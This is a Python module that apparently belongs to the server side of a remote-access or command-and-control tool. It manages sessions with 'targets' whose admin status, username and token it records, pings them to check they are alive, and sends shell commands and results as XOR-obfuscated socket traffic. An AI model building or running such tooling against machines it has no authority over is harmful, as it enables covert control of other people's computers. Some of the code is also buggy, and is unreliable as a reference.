import time
import threading
import socket
from prettytable import PrettyTable


from .handler import Handler
from .sql import Sql
from .other import printColor
from .other import XOREncryption
from .other import pingAllTarget
from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN,NB_SELECT ,SOCK_TIMEOUT


class Management(threading.Thread):
    is_life = "is_life?" 
    
    """
    Send is life. (ping)
    If the customer responds when he wants.
    if the client does not respond then an exception is declared and management puts inactive status (dead) via CheckConn
    """

    def __init__(self,timeout,ObjSql):
        threading.Thread.__init__(self)
        self.timeout = timeout #How long for each check connexion.
        self.ObjSql = ObjSql

 
    def run(self):
        checkConnObjt = CheckConn()
        while(True):
            
            time.sleep(self.timeout)
            pingAllTarget(Handler.dict_conn, checkConnObjt) 


class CheckConn:
    
    #his class allows you to send and receive data on the network in complete security.
    
    def empty_socket(self,sock,timeout=5, buffer=1024): #comming soon
        sock.settimeout(timeout)
        pass


    def connexionIsDead(self, nb_session):
        #print(Handler.dict_conn[nb_session][3])
        Handler.dict_conn[nb_session][NB_ALIVE] = False
        Handler.dict_conn[nb_session][NB_SOCKET] = False
        Handler.dict_conn[nb_session][NB_PORT] = "---"

        Handler.dict_conn[nb_session][NB_SELECT] = False #test
        #self.NewObjSql.updateValue("is_he_alive","False",nb_session,True) #Faut-il changer les valeurs de la db en temps reel ? Ou changer les valeurs lors de l'inialisation du script ?
        #self.NewObjSql.closeConn()
        

    def sendsafe(self, nb_session, sock, payload, display=True): #display = Avoids display bugs (useful in broadcast mode)
        
        '''
        Checks if the socket sending is not lost.
        Example: If the server sending MOD_SHELL is that at the moment the connection is cut then this function is really useful.
        If the server does not manage to contact the client then the connection is dead function is called.
        
        Returns true if the socket was sent if not retrun false if there was a problem.
        '''
        
        try:
            
            tmp = XOREncryption(payload, Handler.PBKDF2_Key)
            sock.send(tmp.encode("utf-16-le"))

        except ConnectionError as connerr: #If the connection does not answer
            if(Handler.status_connection_display and display):
                printColor("error","[-] The connection to the client was cut {}:{}.\n".format(Handler.dict_conn[nb_session][NB_IP],Handler.dict_conn[nb_session][NB_PORT]))
            self.connexionIsDead(nb_session)
            return False
        
        return True


    def recvall(self,sock,buffer):
    #Receives multiple data with timeout
        result =b""
        sock.settimeout(SOCK_TIMEOUT)
        
        while True:
            try:            
                data_tmp = sock.recv(buffer).decode("utf-16-le","replace")
                data = XOREncryption(data_tmp, Handler.PBKDF2_Key)
            except socket.timeout:
                result = b"ERRROR"
                break
            except ConnectionError as connerr:
                printColor("error", "[-] Error in recvall: {}".format(connerr))
                result = "ERROR" #safe ?
                break
            else:
                if(data =="\r\n"):
                    break
                else:
                    result+=data
                
        sock.settimeout(None)
        return result
    

    def recvsafe(self,sock,buffer): #Receives a single secure data (no need for "\r\n") to finish the connection 
        
        result = ""
        sock.settimeout(SOCK_TIMEOUT)
        try:            
            data_tmp = sock.recv(buffer).decode("utf-16-le","replace")
            result = XOREncryption(data_tmp, Handler.PBKDF2_Key)        
            
        except socket.timeout:
            printColor("error", "[-] timeout in recvsafe.")
            result = "ERROR"
        
        except socket.timeout:
            printColor("error","[-] The timeout was exceeded. \n")
        
        except ConnectionError as connerr:
            printColor("error", "[-] error in recvsafe: {}".format(connerr))
            result = "ERROR"
        
        finally:
            sock.settimeout(None)
            return result #empty return
        
    
    def recvcommand(self, sock, buffer):#The decryption of xor is automatic on this method. Does not send data displays the data in real time.
        #Gets the data without delay (session "-c 'command' ")
        
        timeout = 20
        sock.settimeout(timeout)
        list_request = []
        end_XOR = XOREncryption("\r\n",Handler.PBKDF2_Key).encode("utf-16-le")

        #printColor("information", "[?] waiting for the client answer...\n")
        printColor("information", "[?] the command can take up to {} seconds before triggering an exception (timeout).\n".format(timeout))
        
        while True:
            
            try:                
                time.sleep(0.1)

                data_tmp = sock.recv(buffer) #.decode("utf8","replace")
                list_request.append(data_tmp)                
                
            except socket.timeout:

                printColor("error","[-] the timeout was exceeded. \n")
                time.sleep(1)
                break
            
            except ConnectionError as connerr:

                printColor("error", "[-] error in recvsafe: {}".format(connerr))
                time.sleep(1)
                break

            else:
                if(data_tmp == end_XOR):
                    #print("end") # end connection close.
                    break
                else:
                    pass
        
        for i in range(len(list_request) - 1): #-1 for ingore last request (\r\n)
            printColor("successfully", XOREncryption(list_request[i].decode("utf-16-le","replace"), Handler.PBKDF2_Key))


        sock.settimeout(None)
    
    '''
    Note: 
    When sending and receiving commands, the buffer must be small.
    This avoids bugs with the XOREncryption function.
    It is also necessary that when decoding the data, the "replace" argument is preferable to "ignore". Because there is a lot of interaction problem between unicode data and the XOREncryption function.
    '''

